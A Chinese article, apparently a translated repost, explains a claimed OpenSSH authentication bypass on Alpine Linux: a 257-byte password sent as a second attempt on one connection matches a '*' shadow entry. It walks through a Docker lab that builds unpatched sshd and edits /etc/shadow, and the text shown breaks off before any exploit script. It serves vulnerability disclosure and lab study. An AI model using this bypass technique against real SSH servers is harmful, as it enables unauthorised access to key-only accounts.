---
title: SSH漏洞：一个257字节的密码如何绕过Alpine Linux上的OpenSSH身份验证
url: https://mp.weixin.qq.com/s/pewsk4ysYzIS4ppz89BE8A
source: Doonsec's feed
date: 2026-11-24
fetch_date: 2026-11-25T10:39:04.335424
---

# SSH漏洞：一个257字节的密码如何绕过Alpine Linux上的OpenSSH身份验证

# SSH漏洞：一个257字节的密码如何绕过Alpine Linux上的OpenSSH身份验证

Ots安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

门锁上仍然显示“密码无效”，但门还是开了。

这是 CVE-2026-123158。一个没有有效密码的 SSH 账户被成功登录。这种账户通常只允许用户使用密钥登录，无需密钥，只需一个 257 字节的 A 字符串即可。

我亲自运行了这段程序。以下是详细过程，包括过程中出现的两个问题。

---

### SSH密码认证的底层工作原理

当你在 SSH 登录提示符中输入密码时，服务器不会直接将其与存储的密码进行比较。在 Linux 系统中，密码永远不会以明文形式存储。存储的是密码的哈希值，也就是经过加密处理的单向密码。

服务器会获取你输入的内容，使用相同的算法将其打乱，然后比较这两个打乱后的版本。如果它们匹配，你就登录成功了。

扰乱函数被称为`crypt()`。它位于 C 标准库中，C 标准库是每个 Linux 程序所依赖的底层代码。

问题在于，并非所有Linux系统都使用相同的C库。

---

### 两个 C 语言库，一个细微差别。

大多数Linux系统（Ubuntu、Debian、Fedora）都使用**glibc**。它是最早的、经过最广泛测试的C语言库。

Alpine Linux 使用**musl**。它体积更小、速度更快，被广泛用作 Docker 容器和其他最小化 Linux 环境的轻量级基础镜像。

musl 的`crypt()`功能具有 glibc 所不具备的行为。

输入超过 256 字节的密码。它不会返回哈希值，而是返回空字符串`*`。

只有一个星号。没有错误提示。没有警告。一片寂静。

我已经直接确认过了。这个测试必须在 Alpine 容器内运行。在 Ubuntu 上，同样的测试会加载 glibc 并返回所有测试长度的真实哈希值。所以要像这样运行它——加上`docker exec sshhole-lab`前缀——而不是从主机终端运行：

```
$ docker exec sshhole-lab python3 -c "import ctypes, ctypes.utillibc = ctypes.CDLL(ctypes.util.find_library('c'))libc.crypt.restype = ctypes.c_char_plibc.crypt.argtypes = [ctypes.c_char_p, ctypes.c_char_p]salt = b'\$6\$testsalt'for n in [100, 255, 256, 257, 300, 1024]:    pw = b'A' * n    r = libc.crypt(pw, salt)    print(f'{n} bytes: {r.decode()[:20]}')"
100 bytes:  $6$testsalt$ZLbIARBD...255 bytes:  $6$testsalt$YiF...256 bytes:  $6$testsalt$Sai...257 bytes:  *300 bytes:  *1024 bytes: *
```

256 字节：普通哈希。257 字节：`*`。

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0FGsmV5nGnQXT7ZMxqf5iafYtU0aeoibJ7IqmicP2q0ibI5r6vZ9XF0OqDkcVFZcJ36LpUGSdV5vrlnc5qnh1zBiaVZicX7qPW2IDqXc/640?wx_fmt=png&from=appmsg)

那`*`将会引发问题。

---

### 被锁定的账户

在 Linux 系统中，影子文件存储密码哈希值。它位于 [此处应填写路径`/etc/shadow`]。您需要 root 权限才能读取它。

一个正常的账户看起来是这样的：

```
ramesh:$6$salt$longhashstring...:19000:0:99999:7:::
```

这`$6$...`是密码的 SHA-512 哈希值。

一个绝对不应该接受密码的账户看起来像这样：

```
victim:*:20780:0:99999:7:::
```

影子密码字段中的星号表示存储的哈希值无效。Unix 密码身份验证无法通过此哈希值验证。它本身并不会使帐户变为“仅密钥”帐户，这取决于 SSH 配置。这意味着：任何密码比较都将失败，因为任何真实密码的哈希值都不可能与此星号匹配`*`。

人们通常都是这样认为的。

---

### 打破常规的两步舞

以下是您尝试以用户身份登录时，OpenSSH 身份验证代码内部实际发生的情况`victim`。

OpenSSH 查找`victim`'s shadow 条目。它找到了`*`。

它需要调用某个函数`crypt(your_password, salt)`，但`*`该函数返回的盐值无效。因此，OpenSSH 提供了一个名为 `getSalt` 的函数`pick_salt()`，该函数会遍历系统上的所有账户，并从拥有有效盐值的用户那里借用一个真正的盐值。

假设`normaluser`有一个真实的密码哈希值。`pick_salt()`提取`normaluser`该哈希值的盐值并将**其缓存在静态缓冲区中**。

问题出在那个静态缓冲区上。

**尝试 1：**你发送一个任意短密码。`pick_salt()`程序运行，找到盐值并将其缓存。`crypt("wrongpassword", salt)`返回一个真实的哈希值。该哈希值与你输入的密码不匹配`*`。登录失败。到目前为止，一切正常。

**第二次尝试：**在同一个 TCP 连接上，你发送一个 257 字节的密码。`pick_salt()`程序再次运行，但这次缓存已在第一次尝试中被填满，因此它跳过了整个遍历过程，直接返回缓存的盐值。原本应该重置缓存的函数调用从未执行。

然后：`crypt("AAAA...257 bytes...", salt)`→ 返回`*`。

`*`与影子条目比较`*`→ 它们匹配。

**你已成功进入。**

---

### 为什么第一次尝试总是失败

上述解释称，第一次尝试“用于初始化缓存，通常会失败”。但实际上还有更具体的原因。

musl 的`getspnam()`函数使用了一个静态内部缓冲区。当 OpenSSH 调用它来获取`victim`'s shadow 条目时，它得到的是指向该缓冲区的指针，而不是缓冲区的副本。

然后再次`pick_salt()`调用`getspnam()`以查找`normaluser`盐值。第二次调用会覆盖同一个缓冲区。OpenSSH`explicit_bzero()`在提取盐值后还会调用函数来清除借用的哈希数据。

当`strcmp()`第一次尝试执行最终操作时，OpenSSH 持有的用于存储受害者影子哈希值的指针已不再指向目标地址`*`。缓冲区已被第二次查找重写。比较失败并非因为哈希值不匹配，而是因为受害者的原始哈希值`*`在比较运行之前已从内存中销毁。

第二次尝试时，`pick_salt()`由于缓存的盐值已命中，因此跳过了调用`getspnam()`。缓冲区重用未发生。`crypt()`返回`*`257 字节的密码，并`strcmp("*", "*")`成功。

因此，两次尝试都必须在同一个 TCP 连接上进行。sshd 在第一次尝试中的内部状态（缓存的盐值、影子指针）必须保留到第二次尝试中。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0ENcCdicAqg0cnnryRusIuiavlgpRSFj8zTJmiaoibMzHVgibU6JCI90Jia9ty4NXygxWajmmYwk5fXzSf1j3JDDCKvHzayjvHdsS6rE/640?wx_fmt=jpeg&from=appmsg)

### 实验室搭建

我在一台使用 Docker 的 VPS 上重现了这个问题。所有操作都在容器内进行，不会影响主机。

提取Alpine image：

```
$ docker pull alpine:3.24$ docker run -d --name sshhole-lab alpine:3.24 sleep infinity
```

无需端口映射。漏洞利用脚本在容器内部运行`docker exec`，因此可以直接连接到`127.0.0.1:2222`目标主机。如果您想从主机连接，请在下面的脚本中添加`-p 2223:2222`并更改 ` `PORT = 2222`<host> ` 参数。`PORT = 2223`

安装 OpenSSH：

```
$ docker exec sshhole-lab apk add --no-cache openssh shadow python3 py3-paramiko$ docker exec sshhole-lab ssh -VOpenSSH_10.3p1, OpenSSL 3.5.9 29 Sep 2026
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0HHyIlWqUn96620kZvdbjarZxKvKvcbwLJVShJ6mbkWnvVyEWoWKicwnRjM0a3icWwvB7ibsAgwmUvzy0Z2sNAZiceD5qYjhnh9TAs/640?wx_fmt=jpeg&from=appmsg)

创建两个账户：

```
$ docker exec sshhole-lab adduser -D -s /bin/sh victim$ docker exec sshhole-lab adduser -D -s /bin/sh normaluser$ docker exec sshhole-lab sh -c 'echo "normaluser:Password123!" | chpasswd'
```

现在检查一下阴影条目的样子：

```
$ docker exec sshhole-lab grep -E 'victim|normaluser' /etc/shadow
victim:!:20780:0:99999:7:::normaluser:$6$E2OOhOYqg5Ji29lB$DRgzD1eGb...:20780:0:99999:7:::
```

`victim`已锁定`!`，这意味着账户已被锁定。`!`仅凭这一点并不能重现漏洞。该漏洞需要`*`影子字段中存在特定值。我特意将其更改为与生产环境中仅密钥账户的配置方式一致：

```
$ docker exec sshhole-lab sed -i 's|^victim:!:|victim:*:|' /etc/shadow$ docker exec sshhole-lab grep victim /etc/shadow
victim:*:20780:0:99999:7:::
```

在实际系统中，设置为仅密钥的帐户通常`*`从一开始就具有而不是`!`。

配置 sshd。我第一次尝试时`UsePAM no`遇到了这个问题：

```
/etc/ssh/sshd_config line 6: Unsupported option UsePAM
```

这个错误恰恰是问题的关键所在。Alpine 的 OpenSSH 构建时没有 PAM 支持。这是导致此漏洞的前提条件之一。支持 PAM 的系统使用不同的身份验证路径，因此不受影响。

删除该行。配置文件将在下面的构建部分中创建。

---

### 为什么我必须从源代码构建

Alpine 的软件包`openssh-10.3_p1-r2`已经包含了该修复程序。当我针对系统自带的 sshd 运行漏洞利用程序时，所有密码都被阻止了，包括 257 字节的密码。

`-r2`软件包版本末尾的那个数字是 Alpine 对上游版本的第二次修订。修复程序已悄然应用到该版本中，同时保持了相同的上游版本号。

为了展示实际的漏洞，我不得不构建原始的未打补丁的源代码。

```
$ docker exec sshhole-lab apk add build-base openssl-dev zlib-dev wget$ docker exec sshhole-lab wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.3p1.tar.gz -O /tmp/openssh-10.3p1.tar.gz$ docker exec sshhole-lab sh -c 'cd /tmp && tar xzf openssh-10.3p1.tar.gz && cd openssh-10.3p1 && ./configure --sysconfdir=/etc/ssh-vuln --without-pam && make sshd sshd-session sshd-auth'
```

构建步骤大约需要一分钟。你会看到配置过程输出数百行信息`checking for...`，然后是编译器运行的画面。这些都是正常现象。请等待 shell 提示符返回。

OpenSSH 10.3 分为三个二进制文件：`sshd`监听器、`sshd-session`会话处理程序和`sshd-auth`身份验证程序。我费了好大劲才发现这一点。`sshd`单独运行会得到以下结果：

```
/usr/local/libexec/sshd-session does not exist or is not executable
```

然后，在解决这个问题之后：

```
/usr/local/libexec/sshd-auth does not exist or is not executable
```

两者都必须位于该目录下`/usr/local/libexec/`。在复制它们之前，我遇到了另一个问题。默认情况下，Alpine 系统上不存在该目录：

```
$ docker exec sshhole-lab sh -c 'cp /tmp/openssh-10.3p1/sshd-session /tmp/openssh-10.3p1/sshd-auth /usr/local/libexec/'cp: can't create '/usr/local/libexec/sshd-session': No such file or directorycp: can't create '/usr/local/libexec/sshd-auth': No such file or directory
```

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0EyjMic7Qfa5rQK0hfrkv1V25ylovr4fYcruwvtic6QY6ia7mgiaAiblklX5ODJ9wF7maLu3ysAddmDABqR1EEI9xgOvadWTm7axnho/640?wx_fmt=png&from=appmsg)

先创建目录，然后复制：

```
$ docker exec sshhole-lab mkdir -p /usr/local/libexec/$ docker exec sshhole-lab sh -c 'cp /tmp/openssh-10.3p1/sshd-session /tmp/openssh-10.3p1/sshd-auth /usr/local/libexec/'
```

现在创建配置目录和配置文件：

```
$ docker exec sshhole-lab mkdir -p /etc/ssh-vuln$ docker exec sshhole-lab sh -c 'cat > /etc/ssh-vuln/sshd_config << EOFPort 2222PasswordAuthentication yesPubkeyAuthentication noMaxAuthTries 6LogLevel VERBOSEHostKey /etc/ssh/ssh_host_ed25519_keyEOF'
```

生成主机密钥并测试配置：

```
$ docker exec sshhole-lab ssh-keygen -A$ docker exec sshhole-lab /tmp/openssh-10.3p1/sshd -t -f /etc/ssh-vuln/sshd_config
```

如果没有输出，`-t`则表示配置有效。在后台启动存在漏洞的守护进程：

```
$ docker exec -d sshhole-lab /tmp/openssh-10.3p1/sshd -f /etc/ssh-vuln/sshd_config -D -e
```

确认它正在监听。注意：Alpine 系统没有该`ss`命令。我运行了文章中的原始命令，结果如下：

```
$ docker exec sshhole-lab ss -tlnp | grep 2222OCI runtime exec failed: exec: "ss": executable file not found in $PATH
```

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0H0KK2ZAluFGZwbgUfSKib5oIA5RXJw01tZoPiaAOqrJ0kPpPu91cynJ6dzJBvo2hFqgAkUqQa0ckq15R6j0GWx5aX6GJG7nYEV4/640?wx_fmt=png&from=appmsg)

请改用`netstat`：

```
$ docker exec sshhole-lab netstat -tlnpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address      Foreign Address  State    PID/Program nametcp        0      0 0.0.0.0:2222       0.0.0.0:*        LISTEN   8288/sshd -Dtcp        0      0 :::2222            :::*             LISTEN   8288/sshd -D
```

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0HrZacziae1ibqL6kQ...